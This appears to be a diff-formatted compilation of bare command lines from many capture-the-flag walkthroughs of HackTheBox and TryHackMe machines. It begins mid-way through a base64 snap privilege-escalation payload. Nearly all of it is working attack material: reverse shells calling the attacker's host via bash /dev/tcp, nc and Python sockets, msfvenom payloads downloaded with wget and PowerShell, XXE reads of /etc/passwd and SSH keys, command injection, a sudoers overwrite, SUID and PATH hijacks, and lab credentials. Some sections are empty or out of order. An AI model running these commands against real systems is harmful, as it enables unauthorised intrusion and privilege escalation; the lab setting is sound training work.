QAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > raj.snap
+sudo /usr/bin/snap install –devmode raj.snap
+tail /etc/passwd
+su dirty_sock
+sudo -i
 
 
 
 Challenge URL: https://www.hackingarticles.in/cap-hackthebox-walkthrough/
+nmap -A 10.129.231.234
+http://10.129.231.234/data/0
+Username Nathan
+Password  Buck3tH4TF0RM3!
+ssh nathan@10.129.231.234
+ls
+cat user.txt
+ls
+python –m SimpleHTTPServer 80
+cd /tmp
+wget 10.10.14.54 /linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'    
+cd /root
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/love-hackthebox-walkthrough/
+nmap –sV 10.129.223.226
+dirb http://love.htbdirb http://love.htb
+http://127.0.0.1:5000
+User = "admin"
+Pass = "@LoveIsInTheAir!!!!"
+use exploit/windows/misc/hta_server
+set srvhost 10.10.14.100
+set lhost 10.10.14.100
+exploit
+http://love.htb/images/simple-backdoor.php?cmd=mshta.exe http://10.10.14.100:8080/1Tva0HNPx.hta
+upload /root/Downloads/winPEASx64.exe
+shell
+winPEASx64.exe
+use exploit/windows/local/always_install_elevated
+set lhost 10.10.14.100
+set session 2
+set lport 8888
+http://love.htb/images/simple-backdoor.php?cmd=dir c:\users\Phoebe\Desktop
+http://love.htb/images/simple-backdoor.php?cmd=type c:\users\Phoebe\Desktop\user.txt
+msfvenom –p windows/shell_reverse_tcp lhost=10.10.14.100 lport=9999 –f exe >shell.exe
+http://love.htb/images/simple-backdoor.php?cmd=powershell.exe wget http://10.10.14.100/shell.exe -o c:\users\Phoebe\shell.exe
+http://love.htb/images/simple-backdoor.php?cmd=c:\users\Phoebe\shell.exe
+wget http://10.10.14.100/winPEASx64.exe -o winPEASx64.exe
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.100 lport=5545 -f msi > priv.msi
+cd c:\users\public
+powershell.exe wget http://10.10.14.100/priv.msi -o priv.msi
+msiexec /quiet /qn /i priv.msi
 
 
 
 Challenge URL: https://www.hackingarticles.in/spectra-hackthebox-walkthrough/
+nmap –A  10.129.223.138
+http:10.129.223.138
+cat /etc/hosts
+curl http://spectra.htb/testing/wp-config.php.save
+spectra.htb/main/wp-login.php
+use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.129.223.138
+set targeturi /main
+set password devteam01
+set lhost 10.10.14.100
+exploit
+cat /etc/passwd
+cd /home/katie
+ls
+cat user.txt
+cd opt
+ls -la
+cat autologin.config.orig
+cd /etc/autologin
+ls -la
+cat passwd
+ssh katie@10.129.223.138
+id
+sudo –l
+find / -type f –group developers 2>dev/null –ls
+cat /etc/init/test.conf
+chmod +s /bin/bash
+end script
+sudo /sbin/initctl start test
+/bin/bash –p
 
 
 
 Challenge URL: https://www.hackingarticles.in/knife-hackthebox-walkthrough/
+nmap –A 10.129.223.91
+http://10.129.223.91
+nikto –h 10.129.223.91
+nc –lvp 2334
+python3 49933.py
+http://10.129.223.91
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.100 1234 >/tmp/f
+sudo -l
+sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
+cd /root
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/scriptkiddie-hackthebox-walkthrough/
+nmap –A 10.129.95.150
+use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
+set lhost 10.10.14.100
+set lport 1234
+exploit
+nc –lvp 1234
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+cd /home/kid
+echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.100/4445 0>&1' #" >> hackers
+sudo /opt/metasploit-framework-6.0.9/msfconsole
+exec:whoami
+exec:/bin/bash
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/simple-ctf-tryhackme-walkthrough/
+nmap -sC -sT 10.10.146.189
+dirb http://10.10.146.189
+http://10.10.146.189/simple/
+searchsploit cms made simple
+searchsploit -m 46635
+python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+ssh mitch@10.10.146.189 -p 2222
+ls
+cat user.txt
+ls /home
+sudo -l
+sudo vim -c ":!/bin/sh"
+id
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/kenobi-tryhackme-walkthrough/
+nmap -sV -sC 10.10.101.175
+smbclient -L \\10.10.101.175
+smbclient //10.10.101.175/anonymous
+ls
+get log.txt
+cat log.txt
+searchsploit ProFTPD 1.3.5
+searchsploit -m 36742
+cat 36742.txt
+nc 10.10.101.175 21
+SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+mkdir /mnt/ignite
+mount 10.10.101.175:/var /mnt/ignite
+cd /mnt/ignite/tmp
+ls
+cp id_rsa /root/
+cd /root
+chmod 600 id_rsa
+ssh -i id_rsa kenobi@10.10.101.175
+cat user.txt
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/menu
+strings /usr/bin/menu
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+Id
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/retro-tryhackme-walkthrough/
+nmap -sV -sC 10.10.167.18
+http://10.10.167.18/
+dirb http://10.10.167.18/ /usr/share/dirb/wordlists/big.txt
+http://10.10.167.18/retro/
+http://10.10.167.18/retro/index.php/author/wade/
+http://10.10.167.18/retro/index.php/2019/12/09/ready-player-one/#comment-2
+xfreerdp /u:wade /p:parzival /v:10.10.167.18
 
 
 
 Challenge URL: https://www.hackingarticles.in/mustacchio-tryhackme-walkthrough/
+nmap -sC -sV  10.10.74.246
+http://10.10.74.246
+dirb http://10.10.74.246
+http://10.10.74.246/custom
+http://10.10.74.246/custom/js
+wget http://10.10.74.246/custom/js/users.bak
+sqlitebrowser users.bak
+nano file
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 file
+http://10.10.74.246:8765
+admin
+bulldog19
+http://10.10.74.246:8765/home.php
+source:http://10.10.74.246:8765/home.php
+wget http://10.10.74.246:8765/auth/dontforget.bak
+file dontforget.bak
+cat dontforget.bak
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+nano key
+/usr/share/john/ssh2john.py key > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+chmod 600 key
+ssh barry@10.10.74.246 -i key
+urieljames
+cat user.txt
+find / -perm -u=s -type f 2>/dev/null
+ls -la /home/joe/
+strings /home/joe/live_log
+cd /tmp
+echo "/bin/bash" > tail
+chmod 777 tail
+export PATH=/tmp:$PATH
+/home/joe/live_log
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/adventure-time-tryhackme-walkthrough/
+nmap -sV 10.10.230.20
+https://10.10.230.20
+https://10.10.230.20/candybar
+view-source:https://10.10.230.20/candybar
+<!-- KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4=== -->
+echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d
+nano /etc/hosts
+cat /etc/hosts
+view-source:https://land-of-ooo.com/yellowdog/bananastock
+<!-- _/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__ -->
+<!--
+Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
+Key = my cool password
+IV = abcdefghijklmanopqrstuvwxyz
+Mode = CBC
+Input = hex
+Output = raw
+-->
+telnet land-of-ooo.com 31337
+ricardio
+ssh apple-guards@land-of-ooo.com
+ls
+cat flag1
+cat flag.txt
+find / -user marceline -type f 2>/dev/null
+/etc/fonts/helper
+/etc/fonts/helper
+Abadeer
+su marceline
+cd ~
+ls
+cat flag2
+telnet land-of-ooo.com 31337
+ApplePie
+su peppermint-butler
+cd ~
+ls
+cat flag3
+python3 -m http.server
+wget http://10.10.230.20:8000/butler-1.jpg
+find / -user peppermint-butler -type f 2>/dev/null
+cat /usr/share/xml/steg.txt
+steghide extract -sf butler-1.jpg
+ls | grep secrets.zip
+crunch 18 18 -t 'The Ice King s@@@@' > file.txt
+hydra -l gunter -P file.txt ssh://10.10.230.20
+su gunter
+cd ~
+ls
+cat flag4
+find / -perm -u=s -type f 2>/dev/null
+cat /etc/exim4/update-exim4.conf.conf
+git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
+cd exim4
+ls
+nano wizard.py
+python -m SimpleHTTPServer
+wget http://10.10.209.22:8000/wizard.py
+mv wizard.py /tmp
+cd /tmp
+ls
+python3 wizard.py
+id
+ls /home
+cd /home/bubblegum
+ls
+cd Secrets
+ls
 
 
 
 Challenge URL: https://www.hackingarticles.in/skynet-tryhackme-walkthrough/
+nmap -sC -sV 10.10.61.86
+http://10.10.61.86
+smbclient -L 10.10.61.86
+smbclient //10.10.61.86/anonymous  
+ls
+get attention.txt
+cd logs
+ls
+get log1.txt
+get log2.txt
+get log3.txt
+cat attention.txt
+cat log1.txt   
+cat log2.txt
+cat log3.txt
+dirb http://10.10.61.86
+http://10.10.61.86/squirrelmail/
+Username: milesdyson
+Password: cyborg007haloterminator
+Password: )s{A&2Z=F^n_E.B`
+smbclient //10.10.61.86/milesdyson -U milesdyson
+)s{A&2Z=F^n_E.B`
+ls
+cd notes
+ls
+get important.txt
+cat important.txt
+http://10.10.61.86/45kra24zxs28v3yd/
+dirb http://10.10.61.86/45kra24zxs28v3yd/
+http://10.10.61.86/45kra24zxs28v3yd/administrator/
+searchsploit cuppa
+searchsploit -m 25971.txt
+cat 25971.txt 
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://10.10.61.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+nano php-reverse-shell.php
+python -m SimpleHTTPServer
+http://10.10.61.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.110.53:8000/php-reverse-shell.php
+nc -lvp 1234
+id
+cd /home
+ls
+cd milesdyson
+cat user.txt
+cd backups
+ls -la
+cat backup.sh
+cat /etc/crontab
+cd /var/www/html
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh pavan.sh"
+echo "/var/www/html"  > --checkpoint=1
+sudo -l
+sudo bash
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/luanne-hackthebox-walkthrough/
+nmap -A 10.129.147.195
+http://10.129.147.195
+gobuster dir --url http://10.129.147.195/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
+http://10.129.147.195/robots.txt
+gobuster dir --url http://10.129.147.195/weather/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
+10.129.147.195/weather/forecast
+10.129.147.195/weather/forecast?city=list
+10.129.147.195/weather/forecast?city=London'
+10.129.147.195/weather/forecast?city=London’)os.execute("cat /etc/passwd")--
+10.129.147.195/weather/forecast?city=London’)os.execute(“URL Encoded Reverse Shell Code”)--
+nc -lvp 1234
+ls -la
+cat .htpasswd
+netstat -ant
+john -wordlist=/usr/share/wordlists/rockyou.txt luannehash
+iamthebest
+curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
+ssh -I key r.michaels@10.129.147.195
+ls -la
+cat user.txt
+cd backups
+ls -la
+netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/raj.tar.gz
+cd /tmp
+tar -xf raj.tar.gz
+cd devel-2020-09-16/
+ls
+cd www
+ls -la
+cat .htpasswd
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+littlebear
+doas su
+littlebear
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/laboratory-hackthebox-walkthrough/
+nmap -A 10.129.148.89
+https://laboratory.htb
+gobuster dir --url https://laboratory.htb/ --wordlist /usr/share/dirbuster/wordlists/directory-list-lowcase-2.3-small.txt -t 50
+nano /etc/hosts
+10.129.148.89 laboratory.htb git.laboratory.htb
+https://git.laboratory.htb/users/sign_in
+use exploit/multi/http/gitlab_file_read_rce
+set rhosts 10.129.148.89
+set rport 443
+set vhost git.laboratory.htb
+set username ignite
+set password 12345678
+set ssl true
+set lhost 10.10.14.108
+exploit
+bash -i
+bash -i
+gitlab-rails console
+user-User.find(1)
+user.password = “87654321”
+user.password_confirmation = “87654321”
+user.save!
+ssh -i key dexter@10.129.148.89
+find / -perm -u=s -type f 2>/dev/null
+echo "/bin/bash" > chmod
+chmod 777 chmod
+export PATH=/tmp:$PATH
+/usr/local/bin/docker-security
+cd /root
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/ready-hackthebox-walkthrough/
+nmap -A 10.129.149.69
+searchsploit gitlab 11.4.7 
+searchsploit -m 49334 
+cat 49334.py
+python3 49334.py -g http://10.129.149.69 -u ignite -p 12345678 -l 10.10.14.108 -P 1234
+nc -lvp 1234
+id
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+cd /tmp
+wget 10.10.14.108:8000/linpeas.sh 
+chmod 777 linpeas.sh 
+./linpeas.sh
+cd /opt 
+ls 
+cd /backup 
+ls 
+cat gitlab.rb | grep password 
+su root 
+Password : wW59U!ZKMbG9+*#h
+cd /tmp 
+wget 10.10.14.108:8000/raj.sh 
+chmod 777 raj.sh 
+./raj.sh
+nc -lvp 9000 
+cd /root 
+ls 
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/time-hackthebox-walkthrough/
+nmap -A 10.129.148.206
+https://github.com/jas502n/CVE-2019-12384
+git clone https://github.com/jas502n/CVE-2019-12384.git
+cd CVE-2019-12384
+ls
+cat inject.sql
+bash -i >& /dev/tcp/10.10.14.108/1234 0>&1
+python -m SimpleHTTPServer
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.108:8000/inject.sql'"}]
+nc -lvp 1234
+cd /home
+ls
+cd /pericles
+ls
+cat user.txt
+cd /tmp
+wget 10.10.14.108:8000/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh
+echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.108 4444 >/tmp/f" >> /usr/bin/timer_backup.sh
+nc -lvp 4444
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/pickle-rick-tryhackme-walkthrough/
+nmap -sC -sV 10.10.43.98
+http://10.10.43.98/
+dirb http://10.10.43.98
+http://10.10.43.98/robots.txt
+dirb http://10.10.43.98 -X .php
+http://10.10.43.98/login.php
+R1ckRul3s
+Wubbalubbadubdub
+bash -c 'bash -i >& /dev/tcp/10.10.210.158/8080 0>&1'
+nc -lvp 8080
+ls
+cat Sup3rS3cretPickl3Ingred.txt
+cd /home
+ls
+cd rick
+ls
+cat 'second ingredients'
+sudo -l
+sudo bash
+whoami
+cd /root
+cat 3rd.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/bookstore-tryhackme-walkthrough/
+nmap -sV -sC 10.10.136.136
+http://10.10.136.136/
+http://10.10.136.136:5000/
+http://10.10.136.136:5000/robots.txt
+http://10.10.136.136:5000/api
+dirb http://10.10.136.136:5000
+http://10.10.136.136:5000/console
+wfuzz -u http://10.10.136.136:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+wfuzz -u http://10.10.136.136:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+http://10.10.136.136:5000/api/v1/resources/books?show=.bash_history
+http://10.10.136.136:5000/console
+123-321-135
+nc -lvp 1234
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ls -la
+cat user.txt
+./try-harder  
+123
+python3 -m http.server
+wget 10.10.136.136:8000/try-harder
+local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
+python
+0x5dcd21f4 ^ 0x1116 ^ 0x5db3
+./try-harder
+1573743953
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/delivery-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/ultratech-tryhackme-walkthrough/
+nano /etc/hosts
+10.129.149.209  delivery.htb
+nmap -p- -A delivery.htb
+nano /etc/hosts
+10.129.149.79 delivery.htb helpdesk.delivery.htb
+Username: maildeliverer
+Password: Youve_G0t_Mail!
+ssh maildeliverer@10.129.149.209
+cd /tmp
+wget 10.10.14.108:8080/linpeas.sh
+chmod 777 linpeas.sh
+cd /opt
+ls
+cd mattermost
+ls
+cd config
+cat config.json
+Username: mmuser
+Password: Crack_The_MM_Admin_PW
+mysql -h 127.0.0.1 -u'mmuser' -p
+show database;
+use mattermost;
+show tables;
+select Username, password from Users;
+nano file
+cat file
+hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file > dict.txt
+john --wordlist=/root/dict.txt hash
+su root
+PleaseSubscribe!21
+cd /root
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/watcher-tryhackme-walkthrough/
+nmap -sC -sV 10.10.49.142
+http://10.10.49.142/
+dirb http://10.10.49.142/ -X.php,.txt
+http://10.10.49.142/robots.txt
+http://10.10.49.142/flag_1.txt
+http://10.10.49.142/post.php
+http://10.10.49.142/post.php?post=striped.php
+http://10.10.49.142/post.php?post=../../../../../../etc/passwd
+http://10.10.49.142/post.php?post=secret_file_do_not_read.txt
+ftp 10.10.49.142
+ftpuser
+givemefiles777
+ls -la
+get flag_2.txt
+cd files
+ls -la
+bye
+cat flag_2.txt
+nano shell.php
+ftp 10.10.49.142
+ftpuser
+givemefiles777
+cd files
+put shell.php
+bye
+http://10.10.49.142/post.php?post=/home/ftpuser/ftp/files/shell.php
+nc -lvp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /var/www/html
+ls
+cd more_secrets_a9f10a/
+ls
+cat flag_3.txt
+sudo -l
+sudo -u toby /bin/bash
+cd ~
+ls -la
+cat flag_4.txt
+cat note.txt
+cat /etc/crontab
+ls -la /home/toby/jobs/
+cat /home/toby/jobs/cow.sh
+echo "bash -i >& /dev/tcp/10.10.73.100/8080 0>&1" >> /home/toby/jobs/cow.sh
+nc -lvp 8080
+ls -la
+cat flag_5.txt
+cat note.txt
+sudo -l
+cd scripts
+ls
+cat will_script.py
+cat cmd.py
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.73.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /home/mat/scripts/cmd.py
+sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
+nc -lvp 4444
+ls
+cat flag_6.txt
+id
+cd /opt
+cd backups
+ls
+cat key.b64
+nano key   
+cat key | base64 -d           
+cat key | base64 -d >> id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa root@10.10.49.142
+ls
+cat flag_7.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/blog-tryhackme-walkthrough/
+nmap -sV -sC 10.10.109.33
+nano /etc/hosts
+10.10.109.33 blog.thm
+wpscan --url http://blog.thm/ -e
+nano user.txt
+kwheel
+bjoel
+Karen Wheeler
+Billy Joel
+wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U user.txt
+use exploit/multi/http/wp_crop_rce
+set rhosts 10.10.109.33
+set username kwheel
+set password cutiepie1
+run
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+id
+cd /home
+ls
+cd bjoel
+ls
+cat user.txt
+download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf
+find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/checker
+download /usr/sbin/checker
+/media/usb/
+export admin=pavan
+/usr/sbin/checker
+cat /root/root.txt
+find / -name "user.txt"
+cat /media/usb/user.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/boiler-ctf-tryhackme-walkthrough/
+nmap -sC -sV -Pn -p- 10.10.140.202
+ftp 10.10.140.202
+Anonymous
+ls -la
+get .info.txt
+bye
+http://10.10.140.202/robots.txt
+dirb http://10.10.140.202
+http://10.10.140.202/joomla/
+http://10.10.140.202/joomla/_files/
+echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
+echo "V2hvcHNpZSBkYWlzeQo=" | base64 -d
+http://10.10.140.202/joomla/_test/index.php?plot=;id
+http://10.10.140.202/joomla/_test/index.php?plot=;ls
+http://10.10.140.202/joomla/_test/index.php?plot=;cat log.txt
+basterd
+superduperp@$$
+ssh basterd@10.10.140.202 -p 55007
+superduperp@$$
+ls
+cat backup.sh
+su stoner
+superduperp@$$no1knows
+ls -la
+cat .secret
+cd .nano
+ls -la
+find / -perm -u=s 2>/dev/null
+/usr/bin/find . -exec /bin/sh -p \; -quit
+whoami
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/anonymous-tryhackme-walkthrough/
+nmap -sC -sV 10.10.3.52
+ftp 10.10.3.52
+ls -la
+cd scripts
+ls -la
+get clean.sh
+get removed_files.log
+get to_do.txt
+cat to_do.txt
+cat removed_files.log
+cat clean.sh
+smbclient -L \\anonymous -I 10.10.3.52
+smbclient //10.10.3.52/pics
+ls
+get corgo2.jpg
+get puppos.jpeg
+nano clean.sh
+bash -i >& /dev/tcp/10.10.120.144/1234 0>&1
+ftp 10.10.3.52
+cd scripts
+put clean.sh
+nc -lvp 1234
+ls
+cat user.txt
+find / -perm -u=s 2>/dev/null
+/usr/bin/env /bin/sh -p
+whoami
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/wonderland-tryhackme-walkthrough/
+nmap -sC -sV 10.10.123.139
+http://10.10.123.139/
+dirb http://10.10.123.139/
+http://10.10.123.139/r/
+http://10.10.123.139/r/
+http://10.10.123.139/r/a/
+http://10.10.123.139/r/a/b
+http://10.10.123.139/r/a/b/b
+http://10.10.123.139/r/a/b/b/i
+http://10.10.123.139/r/a/b/b/i/t
+view-source:http://10.10.123.139/r/a/b/b/i/t/
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+ssh alice@10.10.123.139
+HowDothTheLittleCrocodileImproveHisShiningTail
+ls
+cat root.txt
+cat /root/user.txt
+cat walrus_and_the_carpenter.py
+sudo -l
+nano random.py
+import os
+os.system("/bin/bash")
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+cd /home/rabbit/
+ls
+./teaParty
+python3 -m http.server
+wget http://10.10.123.139:8000/teaParty
+strings teaParty
+/bin/echo -n 'Probably by ' && date --date='next hour' -R
+nano date
+chmod +x date
+echo $PATH
+export PATH=/home/rabbit:$PATH
+echo $PATH
+./teaParty
+cd /home/hatter
+ls
+cat password.txt
+wget http://10.10.150.219:6969/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+which perl
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+id
+cat /home/alice/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/tokyo-ghoul-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/dogcat-tryhackme-walkthrough/
+nmap -sC -sV 10.10.43.18
+http://10.10.43.18/
+http://10.10.43.18/jasonroom.html
+view-source:http://10.10.43.18/jasonroom.html
+ftp 10.10.43.18
+anonymous
+ls
+cd need_Help?
+ls
+get Aogiri_tree.txt
+cd Talk_with_me
+ls
+get need_to_talk
+get rize_and_kaneki.jpg
+cat Aogiri_tree.txt
+chmod 777 need_to_talk  
+./need_to_talk
+strings need_to_talk
+./need_to_talk
+steghide extract -sf rize_and_kaneki.jpg    
+cat yougotme.txt
+http://10.10.43.18/d1r3c70ry_center/
+dirb http://10.10.43.18/d1r3c70ry_center/
+http://10.10.43.18/d1r3c70ry_center/claim/
+http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=flower.gif
+http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=../../../../etc/passwd
+http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+nano hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+ssh kamishiro@10.10.43.18
+ls
+cat user.txt
+sudo -l
+cat jail.py
+sudo /usr/bin/python3 /home/kamishiro/jail.py
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
+id
+cd /root
+ls
+cat root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/mnemonic-tryhackme-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/nax-tryhackme-walkthrough/
+nmap -sC -sV -p- 10.10.169.103
+http://10.10.169.103/robots.txt
+http://10.10.169.103/webmasters/
+dirb http://10.10.169.103
+dirb http://10.10.169.103/webmasters/backups/ -X .php,.png,.zip
+wget http://10.10.169.103/webmasters/backups/backup.zip
+/usr/sbin/zip2john backups.zip > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+unzip backups.zip
+cat backups/note.txt
+hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.169.103 ftp
+ftp 10.10.169.103
+ftpuser
+love4ever
+ls
+cd data-4
+get id_rsa
+get not.txt
+bye
+cat not.txt
+james
+cat id_rsa
+/usr/share/john/ssh2john.py id_rsa > hash
+john hash --wordlist-/usr/share/wordlists/rockyou.txt
+bluelove
+ssh james@10.10.169.103 -p 1337
+ls /home
+ls /home/condor
+nano text
+cat text | base64 -d
+nano text2
+cat text2 | base64 -d
+git clone https://github.com/MustafaTanguner/Mnemonic.git
+cd Mnemonic
+python3 Mnemonic.py
+/root/maxresdefault.jpg
+2
+/root/6450.txt
+pasificbell1981
+ssh condor@10.10.169.103 -p 1337
+pasificbell1981
+sudo -l
+cat /bin/examplecode.py
+sudo python3 /bin/examplecode.py
+sudo python3 /bin/examplecode.py
+0
+.
+/bin/bash
+id
+cat /root/root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/worker-hackthebox-walkthrough/
+nmap -sC -sV 10.129.2.29
+svn checkout svn://10.129.2.29
+cat moved.txt
+nano /etc/hosts
+10.129.2.29  devops.worker.htb dimension.worker.htb
+svn checkout svn://10.129.2.29:3690
+svn diff -r2
+$user = "nathen"                     
+$plain = "wendel98"
+wget https://dl.packetstormsecurity.net/UNIX/penetration/aspxshell.aspx.txt
+mv aspxshell.aspx.txt aspxshell.aspx
+nano /etc/hosts
+10.129.2.29 devops.worker.htb dimension.worker.htb spectral.worker.htb
+evil-winrm -i 10.129.2.29 -u robisl -p wolves11
+cd ..
+cd Desktop
+ls
+type user.txt
+evil-winrm -i 10.129.2.29 -u Administrator -p Password@1
+cd ..
+cd Desktop
+ls
+type root.txt
 
 
 
 Challenge URL: https://www.hackingarticles.in/passage-hackthebox-walkthrough/
-
-
-
-Challenge URL: https://www.hackingarticles.in/academy-hackthebox-walkthrough/
+nmap -sV -sC 10.129.109.173
+nano /etc/hosts
+10.129.109.173  passage.htb
+http://passage.htb/CuteNews/uploads/avatar_ignite_shell.php
+nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
+pwd
+cd /var/www/html
+ls
+cd Cu
+cd cdata
+ls
+cd users
+ls
+cat b0.php
+<?php die('Direct call - access denied'); ?>
